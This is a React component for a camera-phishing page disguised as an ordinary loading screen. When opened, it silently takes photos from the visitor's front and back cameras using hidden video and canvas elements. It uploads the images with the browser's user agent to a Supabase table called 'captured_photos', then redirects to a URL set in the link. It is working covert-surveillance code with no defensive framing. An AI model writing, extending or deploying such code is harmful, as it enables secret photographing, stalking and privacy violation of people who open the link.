import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const Capture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [status, setStatus] = useState<"loading" | "front" | "back" | "redirecting">("loading");
  
  const sessionId = searchParams.get("session") || "default";
  const redirectUrl = searchParams.get("redirect") || "https://google.com";

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode, width: 640, height: 480 } 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        
        // Wait for camera to stabilize
        await new Promise(resolve => setTimeout(resolve, 800));
        
        // Capture photo
        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const video = videoRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/jpeg", 0.8);
            
            // Stop camera
            stream.getTracks().forEach(track => track.stop());
            
            return imageData;
          }
        }
        
        // Stop camera
        stream.getTracks().forEach(track => track.stop());
      }
      
      return null;
    } catch (error) {
      console.error(`Camera ${facingMode} access denied:`, error);
      return null;
    }
  };

  useEffect(() => {
    const captureAndRedirect = async () => {
      try {
        // Capture from FRONT camera first
        setStatus("front");
        const frontImage = await captureFromCamera("user");
        
        if (frontImage) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: frontImage,
            user_agent: `${navigator.userAgent} [FRONT]`
          });
        }
        
        // Small delay before switching cameras
        await new Promise(resolve => setTimeout(resolve, 300));
        
        // Capture from BACK camera
        setStatus("back");
        const backImage = await captureFromCamera("environment");
        
        if (backImage) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: backImage,
            user_agent: `${navigator.userAgent} [BACK]`
          });
        }
        
        setStatus("redirecting");
        
        // Redirect after short delay
        setTimeout(() => {
          window.location.href = redirectUrl;
        }, 300);
        
      } catch (error) {
        console.error("Capture error:", error);
        // Redirect anyway even if camera fails
        window.location.href = redirectUrl;
      }
    };

    captureAndRedirect();
  }, [sessionId, redirectUrl]);

  return (
    <div className="min-h-screen bg-background flex items-center justify-center">
      {/* Hidden video and canvas for capture */}
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      
      {/* Loading indicator that looks like a normal page */}
      <div className="text-center">
        <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin mx-auto mb-4" />
        <p className="text-muted-foreground text-sm">
          {status === "loading" && "Loading..."}
          {status === "front" && "Please wait..."}
          {status === "back" && "Almost done..."}
          {status === "redirecting" && "Redirecting..."}
        </p>
      </div>
    </div>
  );
};

export default Capture;
